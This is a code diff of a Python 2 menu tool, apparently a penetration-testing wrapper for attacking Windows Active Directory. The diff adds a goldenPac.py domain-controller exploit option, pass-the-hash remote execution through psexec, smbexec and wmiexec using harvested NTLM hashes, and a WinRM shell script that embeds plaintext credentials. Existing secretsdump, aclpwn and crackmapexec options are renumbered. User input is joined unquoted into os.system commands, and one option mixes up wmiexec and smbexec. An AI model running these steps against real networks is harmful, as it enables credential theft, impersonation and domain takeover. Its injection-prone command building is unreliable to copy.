@@ -261,16 +261,16 @@ def display():
 
 # ----------------------------------------------------------------------------------------------------------------------------------------------------
 
-   print u'\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) Get Arch (30) Enum4Linux     (40) Kerb Users Info (50) Domain Dump  (60) FTP    " + u'\u2551'
-   print u'\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) Net View (31) WinDap Search  (41) Kerb Filter     (51) Blood Hound  (61) SSH    " + u'\u2551'
-   print u'\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) ACL Pawn     (62) TelNet " + u'\u2551'
-   print u'\u2551' + "(3) Re/Set USERNAME    (13) Check Connection   (23) AtExec   (33) Sam Dump Users (43) Kerb Roasting   (53) Secrets Dump (63) NetCat " + u'\u2551'
-   print u'\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records  (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) CrackMapExec (64) WinRem " + u'\u2551'
-   print u'\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER   (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) WmiExec HASH (65)        " + u'\u2551'
-   print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew    (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56)              (66)        " + u'\u2551'
-   print u'\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Subdomains    (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57)              (67)        " + u'\u2551'
-   print u'\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58)              (68)        " + u'\u2551'
-   print u'\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) OpDump   (39) Rpc Client     (49) Golden Ticket   (59)              (69)        " + u'\u2551'
+   print u'\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) Get Arch (30) Enum4Linux     (40) Kerb Users Info (50) Golden PAC   (60) FTP    " + u'\u2551'
+   print u'\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) Net View (31) WinDap Search  (41) Kerb Filter     (51) Domain Dump  (61) SSH    " + u'\u2551'
+   print u'\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) Blood Hound  (62) TelNet " + u'\u2551'
+   print u'\u2551' + "(3) Re/Set USERNAME    (13) Check Connection   (23) AtExec   (33) Sam Dump Users (43) Kerb Roasting   (53) BH ACLPwn    (63) NetCat " + u'\u2551'
+   print u'\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records  (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) Secrets Dump (64)        " + u'\u2551'
+   print u'\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER   (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) CrackMapExec (65)        " + u'\u2551'
+   print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew    (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56) PsExec HASH  (66)        " + u'\u2551'
+   print u'\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Subdomains    (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) SmbExec HASH (67)        " + u'\u2551'
+   print u'\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) WmiExec HASH (68)        " + u'\u2551'
+   print u'\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) OpDump   (39) Rpc Client     (49) Golden Ticket   (59) Remote Login (69)        " + u'\u2551'
    print u'\u255A' + (u'\u2550')*132 + u'\u255D'
 
 # -------------------------------------------------------------------------------------
@@ -1380,11 +1380,33 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
+# Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='50':
+      print "\n[+] Trying user " + USR.rstrip(" ") + "...\n"
+      os.system(PRO + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + HST.rstrip(" "))
+
+      print "\n[+] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n"
+      HASH = "................................"
+      for x in range (0, MAX):
+         if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
+            HASH = PA[x].rstrip(" ")                 # GET HASH
+      if HASH[:1] != ".":
+         command(PRO + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " -hashes :" + HASH + " "  + HST.rstrip(" ") + "/" + POR.rstrip(" ") + "@" + HST.rstrip(" "))
+      else:
+         command("echo 'Hash value was not found...")
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : 1.0
+# Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='51':
       os.system("ldapdomaindump -u '" + HST.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
       print "\n[+] Checking downloaded files: \n"
       command("ls -la ./" + DIR.rstrip(" "))
@@ -1397,7 +1419,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='51':
+   if selection =='52':
       command("echo 'Reserved for BLOODHOUND command...'")
 
 # ------------------------------------------------------------------------------------- 
@@ -1408,7 +1430,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='52':
+   if selection =='53':
       command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + " -d " + HST.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
@@ -1419,7 +1441,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='53':
+   if selection =='54':
       print "\n[+] Please wait...\n"
       os.remove("SECRETS.tmp")
       os.system(PRO + "secretsdump.py " + HST.rstrip(" ") + '/' + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> SECRETS.tmp")
@@ -1456,7 +1478,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='54':
+   if selection =='55':
       if (USR[:1] != "\"") & (PAS[:1] != "\""):
          print "\n[-]Trying user " + USR.rstrip(" ") + " with password " + PAS.rstrip(" ") + "...\n"
          os.system("crackmapexec -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --shares " + TIP.rstrip(" ")) 
@@ -1480,58 +1502,79 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='55':
+   if selection =='56':
       print "\n[-]Trying user " + USR.rstrip(" ") + " with NTLM HASH " + FRST.rstrip("\n") + "...\n"
-      os.system(PRO + "wmiexec.py -hashes :" + FRST.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+      os.system(PRO + "psexec.py -hashes :" + FRST.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
       print "\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n"
+      HASH = "................................"
       for x in range (0,MAX):
          if US[x].rstrip(" ") == POR.rstrip(" "):
             HASH = PA[x].rstrip(" ")
-      command(PRO + "wmiexec.py -hashes :" + HASH + " " + POR.rstrip(" ") + "@" + TIP.rstrip(" "))
+      if HASH[:1] != ".":
+         command(PRO + "psexec.py -hashes :" + HASH + " " + POR.rstrip(" ") + "@" + TIP.rstrip(" "))     
+      else:
+         command("echo 'No hash value was found for user " + POR.rstrip(" ") + "...'")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='56':
-      exit(1)       
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : 1.0
-# Details : Menu option selected - 
+# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTLM HASH.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='57':
-      exit(1)       
+      print "\n[-]Trying user " + USR.rstrip(" ") + " with NTLM HASH " + FRST.rstrip("\n") + "...\n"
+      os.system(PRO + "smbexec.py -hashes :" + FRST.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+      print "\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n"
+      HASH = "................................"
+      for x in range (0,MAX):
+         if US[x].rstrip(" ") == POR.rstrip(" "):
+            HASH = PA[x].rstrip(" ")
+      if HASH[:1] != ".":
+         command(PRO + "smbexec.py -hashes :" + HASH + " " + POR.rstrip(" ") + "@" + TIP.rstrip(" "))
+      else:
+         command("echo 'No hash value was found for user " + POR.rstrip(" ") + "...'")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - 
+# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTLM HASH.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='58':
-      exit(1) 
+      print "\n[-]Trying user " + USR.rstrip(" ") + " with NTLM HASH " + FRST.rstrip("\n") + "...\n"
+      os.system(PRO + "wmiexec.py -hashes :" + FRST.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+      print "\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n"
+      HASH = "................................"
+      for x in range (0,MAX):
+         if US[x].rstrip(" ") == POR.rstrip(" "):
+            HASH = PA[x].rstrip(" ")
+      if HASH[:1] != ".":
+         command(PRO + "smbexec.py -hashes :" + HASH + " " + POR.rstrip(" ") + "@" + TIP.rstrip(" "))   
+      else:
+         command("echo 'No hash value was found for user " + POR.rstrip(" ") + "...'")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - 
+# Details : Menu option selected - Windows remote login on port 5985.
 # Modified: N/A
-# ------------------------------------------------------------------------------------- 
-   
+# -------------------------------------------------------------------------------------
+
    if selection =='59':
-      exit(1)          
+      os.system('echo "require \'winrm\' " > winshell.rb')
+      os.system('echo "" >> winshell.rb')
+      os.system('echo "conn = WinRM::Connection.new(" >> winshell.rb')
+      os.system('echo "  endpoint: \'http://"' + TIP.rstrip(" ") + '":5985/wsman\', " >> winshell.rb')
+      os.system('echo "  user: \'"' + USR.rstrip(" ") + '"\'," >> winshell.rb')
+      os.system('echo "  password: \'"' + PAS.rstrip(" ") + '"\'," >> winshell.rb')
+      os.system('echo ")" >> winshell.rb')
+      os.system("cat shell.txt >> winshell.rb") # ADD REST WHEN YOU HAVE TIME!!
+      command("ruby winshell.rb")         
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1581,21 +1624,12 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - Windows remote login on port 5985.
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='64':
-      os.system('echo "require \'winrm\' " > winshell.rb')
-      os.system('echo "" >> winshell.rb')
-      os.system('echo "conn = WinRM::Connection.new(" >> winshell.rb')
-      os.system('echo "  endpoint: \'http://"' + TIP.rstrip(" ") + '":5985/wsman\', " >> winshell.rb')
-      os.system('echo "  user: \'"' + USR.rstrip(" ") + '"\'," >> winshell.rb')
-      os.system('echo "  password: \'"' + PAS.rstrip(" ") + '"\'," >> winshell.rb')
-      os.system('echo ")" >> winshell.rb')
-      os.system("cat shell.txt >> winshell.rb") # ADD REST WHEN YOU HAVE TIME!!
-
-      command("ruby winshell.rb")
+      exit(1) 
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
